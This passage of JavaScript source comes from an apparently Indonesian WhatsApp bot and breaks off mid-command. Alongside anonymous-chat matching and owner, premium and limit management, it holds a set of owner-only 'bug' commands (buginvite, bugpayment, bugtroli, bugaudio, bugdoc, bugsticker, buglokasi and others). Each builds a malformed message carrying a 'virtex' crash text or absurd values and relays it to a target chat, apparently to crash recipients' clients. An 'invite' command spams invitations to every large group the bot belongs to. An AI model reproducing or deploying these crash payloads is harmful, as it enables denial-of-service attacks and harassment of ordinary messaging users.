roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))  
},1000)
} else if(roomA && roomA.state == "WAITING"){
setReply("Kamu telah keluar dari room anonymous")
anonChat.splice(anonChat.indexOf(roomA, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else if(roomB && roomB.state == "CHATTING"){
await atak.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
setReply("Kamu telah keluar dari room anonymous dan meninggalkan partner mu") 
roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else setReply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)
}
break
case 'next':{
if (!isRegist) return onlyRegist()
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == "WAITING" ) {
setReply("Mencari Partner...")
anonChat.splice(roomA, 1)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await atak.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await atak.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000) 
} else if(roomA && roomA.state == "CHATTING" ){
await atak.sendMessage(roomA.b, {text: "Partnermu telah mengeluarkanmu dari room Anonymous"})
setReply("Kamu telah mengeluarkan partnermu dari room anonymous ")
await setTimeout(() => {
setReply("Menunggu partner masuk ke dalam room")
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
},1000)
} else if(roomB){
await atak.sendMessage(roomB.a, {text: "Partner telah meninggalkan room anonymous mu"})
setReply("Mohon tunggu sedang mencari room")
roomB.b =  ""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await atak.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await atak.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000) 
} else setReply("Kamu sedang tidak berada di dalam room anonymous")
}
break
case 'sendkontak': {
if (!isRegist) return onlyRegist()
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (roomA && roomA.state == "CHATTING") {
let profile = await atak.profilePictureUrl(roomA.a)
let status = await atak.fetchStatus(roomA.a)
let msg = await atak.sendImage(roomA.b, profile, `Nama : ${await atak.getName(roomA.a)}\nBio : ${status.status}\nUser : @${roomA.a.split("@")[0]}`, m, { mentions: [roomA.a] })
atak.sendContact(roomA.b, roomA.a.split("@")[0], await atak.getName(roomA.a))
} else if(roomB && roomB.state == "CHATTING"){
let profile = await atak.profilePictureUrl(roomB.b)
let status = await atak.fetchStatus(roomB.b)
let msg = await atak.sendImage(roomB.a, profile, `Nama : ${await atak.getName(roomB.b)}\nBio : ${status.status}\nUser : @${roomB.b.split("@")[0]}`, m, { mentions: [roomB.b] })
atak.sendContact(roomB.a, roomB.b.split("@")[0],await atak.getName(roomB.b))
} else if(roomA == "undefined" || roomB == "undefined" ){
setReply("Kamu sedang tidak berada di room anonymous")  
} else setReply("Kamu belum dapat mengirim kontak karena kamu belum punya partner")
}
break
case 'invite':{
if (!isRegist) return onlyRegist()
if(isGroup) return setReply("Fitur tidak bisa di gunakan di dalam group")
if(!roomA) return setReply("Kamu sedang tidak berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let getGroups = await atak.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let ana = groups.map(v => v.id)
let mem = [];
for (let i of ana) {
let data = await atak.groupMetadata(i)
let obj = { id : data.id, total : data.participants.length}
await mem.push(obj) 
}
let groupInvite = await mem.filter(member => member.total > 50 )
let yesnih = [{"buttonId": `${prefix}joinchat ${roomA.id}`,"buttonText": {"displayText": `ᴊᴏɪɴ ᴄʜᴀᴛ`},"type": "RESPONSE"}]
let teks = `
Seseorang telah mengundang kamu 
untuk bergabung ke room anonymous chat
tekan tombol join chat di bawah ini untuk 
bergabung di room anonymous dan memulai 
sesi chat dengan user lain`
await atak.sendMessage(from, {text: `Mengirim undangan anonymous, waktu selesai ${groupInvite.length * 3 } detik`})
for (let i of groupInvite) {
await sleep(3000)
await atak.sendButLoc(i.id, teks,fake,fs.readFileSync('./media/image/anonymous.jpg'), yesnih)
}
await atak.sendMessage(from, {text: `Undangan telah terkirim ke ${groupInvite.length} group` }) 
}
break
case 'joinchat':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan id room anonymous")
if(roomA && roomA.state == "WAITING" ) return setReply("Kamu masih berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let joinRoom = Object.values(anonChat).find(room => room.id == q && room.state == "WAITING")
if (joinRoom) {
await atak.sendMessage(joinRoom.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await atak.sendMessage(joinRoom.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
setReply(`Berhasil join ke room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
} else if (room) {
await atak.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await atak.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
setReply(`Berhasil mendapatkan room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))            
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await atak.sendMessage(sender,{text: `Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`})
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}
}
break
//================================================================================\\
case 'obfus':{
if (!isRegist) return onlyRegist()
var JavaScriptObfuscator = require('javascript-obfuscator');
if(q){
let obfuscationResult = JavaScriptObfuscator.obfuscate(q);
reply(obfuscationResult.getObfuscatedCode());
} else if(isQuotedTeks){
let obfuscationResult = JavaScriptObfuscator.obfuscate(ridho.quoted.text);
reply(obfuscationResult.getObfuscatedCode());
} else setReply("Masukan code java script")
}
break
case 'deobfus':{
if (!isRegist) return onlyRegist()
function beautifyJavaScript (source) {
const beautify = require('js-beautify').js_beautify
return beautify(source, {indent_size: 2})
}  
if(q){
let teks = await beautifyJavaScript(q)
setReply(teks)
} else if(isQuotedTeks){
let teks = await beautifyJavaScript(ridho.quoted.text)
setReply(teks)
} else setReply("Masukan code java script")
}
break
case 'packer':{
if (!isRegist) return onlyRegist()
var UglifyJS = require("uglify-js");
if(q){
let result  = await UglifyJS.minify(q)
reply(result.code)
} else if(isQuotedTeks){
console.log(isQuotedTeks)
let result  = await UglifyJS.minify(ridho.quoted.text)
reply(result.code)
} else setReply("Masukan code java script atau reply file.js")
}
break
//================================================================================\\
case 'addowner':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (checkDataId("owner", Input,  DataId)) return setReply("User sudah menjadi owner")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if (!checkDataName("owner", Input, DataId)) { await createDataId("owner", DataId) }
addDataId(Input, "owner", DataId)
setReply(`Berhasil menambahkan ${Input} ke daftar owner`)
}
break
case 'addlimit': 
case 'giftlimit': 
case 'tambahLimit': 
case 'kasihlimit':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)      
if (mentionByReply) {
tambahLimit(Input.split("@")[0], parseInt(args[0]))         
setReply(`Berhasil Add limit : ${args[0]}\nNo : ${Input.split("@")[0]}`)
} else if(mentionByTag && isGroup) { 
tambahLimit(Input.split("@")[0], parseInt(args[1]))         
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${Input.split("@")[0]}`)
} else if(!isGroup){
tambahLimit(`Input.split("@")[0]`, parseInt(args[1]))
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${Input.split("@")[0]}️`)
} else setReply("Tag atau Reply usernya")
break
case 'addprem':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if (mentionByReply) {
if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
_prem.addPremiumUser (mentionByReply, q, premium)         
setReply(`Succes add premium ${mentionByReply.split("@")[0]}`)
await atak.sendButMessage(mentionByReply, `HALO KAK AKU *${botName}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${botName}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if(mentionByTag && isGroup) { 
let waktu = q.split(" ")[1]
_prem.addPremiumUser (mentionByTag, waktu, premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await atak.sendButMessage(mentionByTag, `HALO KAK AKU *${botName}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${botName}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if(!isGroup){
let usernya = q.split("|")[0] +"@s.whatsapp.net"
let waktunya = q.split("|")[1]
_prem.addPremiumUser (usernya, waktunya, premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await atak.sendButMessage(usernya, `HALO KAK AKU *${botName}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${botName}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else setReply("Tag atau Reply usernya")
break
case 'givesaldo':
case 'addsaldo':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if (!Input) return setReply("Reply tatgetnya")
addBalance(Input.split("@")[0], math(q))
setReply(`Berhasil menambakan saldo ke nomer ${Input.split("@")[0]}`)
}
break
case 'bagilimit': 
case 'berbagilimit':
if (!isRegist) return onlyRegist() 
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)      
if (mentionByReply) {
kurangLimit(senderNumber, parseInt(args[0]))
tambahLimit(Input.split("@")[0], parseInt(args[0]))         
await setReply(`Berhasil Berbagi ${args[0]} Limit\n\nNo : ${Input.split("@")[0]}\nLimit Kamu : ${getLimit(senderNumber)}\nLimit Orgnya : ${getLimit(Input.split("@")[0])}️`)
} else if(mentionByTag && isGroup) { 
kurangLimit(senderNumber, parseInt(args[1]))
tambahLimit(Input.split("@")[0], parseInt(args[1]))         
await setReply(`Berhasil Berbagi ${args[1]} Limit\n\nNo : ${Input.split("@")[0]}\nLimit Kamu : ${getLimit(senderNumber)}\nLimit Orgnya : ${getLimit(Input.split("@")[0])}️`)
} else if(!isGroup){
kurangLimit(senderNumber, parseInt(args[1]))
tambahLimit(`Input.split("@")[0]`, parseInt(args[1]))
await setReply(`Berhasil Berbagi ${args[1]} Limit\n\nNo : ${Input.split("@")[0]}\nLimit Kamu : ${getLimit(senderNumber)}\nLimit Orgnya : ${getLimit(Input.split("@")[0])}️`)
} else setReply("Tag atau Reply usernya")
break
case 'addsewa':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(isGroup){
_sewa.addSewaGroup(from, null, null, q, sewa)
setReply("Sukses")
}
}
break
case 'addcmdowner':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(!q) return setReply(mess.query)
if(checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
if(!checkDataName("commands", q, DataId)) { await createDataId("commands", DataId) }
addDataId(q, "commands", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
}
break
case 'addcmdlimit':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(!q) return setReply(mess.query)
if(checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
if(!checkDataName("limit", q, DataId)) { await createDataId("limit", DataId) }
addDataId(q, "limit", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
}
break  
case 'addcmdprem':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(!q) return setReply(mess.query)
if(checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
addDataId(q, "premium", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
}
break
case 'delowner':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
try {
if(!checkDataId("owner", Input, DataId)) return setReply(`User bukan owner`)
removeDataId ("owner", Input, DataId)
setReply(`Berhasil menghapus ${Input.split("@")[0]} ke daftar owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'dellimit':
case 'hapuslimit':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)      
if (mentionByReply) {
kurangLimit(Input.split("@")[0], parseInt(args[0]))         
setReply(`Berhasil kurangi limit : ${args[0]}\nNo : ${Input.split("@")[0]}`)
} else if(mentionByTag && isGroup) { 
kurangLimit(Input.split("@")[0], parseInt(args[1]))         
await setReply(`Berhasil kurangi limit : ${args[1]}\nNo : ${Input.split("@")[0]}`)
} else if(!isGroup){
kurangLimit(`Input.split("@")[0]`, parseInt(args[1]))
await setReply(`Berhasil kurangi limit : ${args[1]}\nNo : ${Input.split("@")[0]}️`)
} else setReply("Tag atau Reply usernya")
break
case 'delprem':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if(Input){
if(!_prem.checkPremiumUser (Input, premium)) return setReply("Maap kak user tersebut tidak ada di database") 
_prem.delPremiumUser (Input, premium)
setReply(`Succes delete premium ${Input.split("@")[0]}`)             
} else setReply("Tag/Reply/Input nomer target")
break
case 'delcmdowner':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(!q) return setReply(mess.query)
try {
if(!checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
removeDataId ("commands", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'delcmdlimit':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(mess.query)
try {
if(!checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
removeDataId ("limit", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'delcmdprem':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(!q) return setReply(mess.query)
try {
if(!checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
removeDataId ("premium", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'listowner':{
if (!isRegist) return onlyRegist()
if (!checkDataName("owner", q, DataId)) { await createDataId("owner", DataId) }
let atak = await DataId.filter(item => item.name == "owner" )
if(!atak) return setReply("Tidak ada")
let teks ="┌──⭓「 *List Owner* 」\n│\n"
let nunu = atak[0].id
for(let i of nunu){
teks +=`│⭔ wa.me/${i.split("@")[0]}\n`   
}    
teks += `│\n└────────────⭓\n\n*Total ada : ${nunu.length}*`
setReply(teks)
}
break
case 'listlimit':
if (!isRegist) return onlyRegist()
let limitnya = `*List limit*\nJumlah : ${JSON.parse(fs.readFileSync('./database/user.json')).length}\n\n`
JSON.parse(fs.readFileSync('./database/user.json')).map(function(e, i){
limitnya += (i+1)+`📲 Nomer : wa.me/${e.id}\n    📉 Limit : ${e.limit}\n\n`            
});
setReply(limitnya)
break
case 'listprem':{
if (!isRegist) return onlyRegist()
let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
let men = [];
for (let i of premium){
men.push(i.id)
let cekvip = ms(i.expired - Date.now())
txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
}
mentions(txt, men, true)
}
break
case 'listcmdowner':{
if (!isRegist) return onlyRegist()
let atak = await DataId.filter(item => item.name == "commands" )
let teks ="List Commands For Owner\n"
let nunu = atak[0].id
for(let i of nunu){
teks +=`. ${i}\n`   
}    
setReply(teks)
}
break
case 'listcmdlimit':{
if (!isRegist) return onlyRegist()
let atak = await DataId.filter(item => item.name == "limit" )
let teks ="List Commands For limit\n"
let nunu = atak[0].id
for(let i of nunu){
teks +=`. ${i}\n`   
}    
setReply(teks)
}
break
case 'listcmdprem':{
if (!isRegist) return onlyRegist()
if (!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
let atak = await DataId.filter(item => item.name == "premium" )
let teks ="List Command For Premium User\n\n"
let nunu = atak[0].id
for(let i of nunu){
teks +=`• ${toFirstCase(i)}\n`   
}    
teks +=`\n• Total: ${nunu.length}\n` 
setReply(teks)
}
break  
//================================================================================\\
case 'buginvite':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
let buginvite = generateWAMessageFromContent(from ,{
"groupInviteMessage": {
"groupJid": "6283144394823@g.us",
"inviteCode": "UkJdqTXupAtmDwo4",
"inviteExpiration": "1643553084",
"invitetime": "1643293887000",
"groupName": virtex8,
"thumbnail": ofrply,           
"caption": virtex8,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, { quoted: setQuotedBug }) 
atak.relayMessage(from, buginvite.message, { messageId: buginvite.key.id,})	
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugpayment':
case 'bugpay':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": virtex8,
}
}}}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugpolling':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO DEKK 🥶", 
"options": [
   {
"optionName": "VOTE YUK"
   }, 
   {
"optionName": "BERANI VOTE GK"
   }, 
   {
"optionName": "VOTE LAH SEMUA"
   }, 
   {
"optionName": "KATANYA WA KEBAL"
   }, 
   {
"optionName": "SALAM CREATOR BOT"
   }
], 
"selectableOptionsCount": 5
  }
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugtroli': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": virtex8,
"jpegThumbnail": ofrply,
"orderTitle": virtex8,
"sellerJid": "6287721317870@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, order.message, { messageId: order.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugaudio': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, audio.message, { messageId: audio.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugimage': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": virtex8,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, image.message, { messageId: image.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugdocument':
case 'bugdoc': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".ridho",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": virtex8,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, document.message, { messageId: document.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugsticker':
case 'bugstick': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, sticker.message, { messageId: sticker.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'buglokasi': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": virtex8,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: setQuotedBug })
atak.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
atak.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
}
break
case 'bugkatalog':
case 'bugcatalog':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
